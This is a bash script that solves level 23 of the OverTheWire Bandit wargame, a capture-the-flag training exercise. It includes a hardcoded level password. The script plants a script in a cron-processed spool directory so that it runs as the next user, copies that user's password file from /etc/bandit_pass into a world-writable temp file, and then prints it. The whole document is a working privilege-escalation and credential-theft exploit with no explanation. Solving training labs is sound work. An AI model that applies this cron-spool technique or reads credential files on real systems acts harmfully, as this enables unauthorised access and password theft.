#!/bin/bash
# bandit23 pass: gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw
# ssh bandit23@bandit.labs.overthewire.org -p 2220 'bash -s' < bandit23.sh

if [ -d /tmp/fii ]; then
    echo
else
    mkdir /tmp/fii
    chmod 777 /tmp/fii
fi

touch /tmp/fii/fill
chmod 777 /tmp/fii/fill

touch /tmp/fii/z.sh
chmod 777 /tmp/fii/z.sh

echo "#!/bin/bash" > /tmp/fii/z.sh
echo "cat /etc/bandit_pass/bandit24 > /tmp/fii/fill" >> /tmp/fii/z.sh

mv /tmp/fii/z.sh /var/spool/bandit24/foo

a=62

# If this block does not working remove the while loop and do this:
# sleep 62
while [ "$a" -gt 0 ]; do
    printf "\rWaiting: %2ds" "$a"
    sleep 1
    ((a--))
done
echo
echo "The password is: $(cat /tmp/fii/fill)"
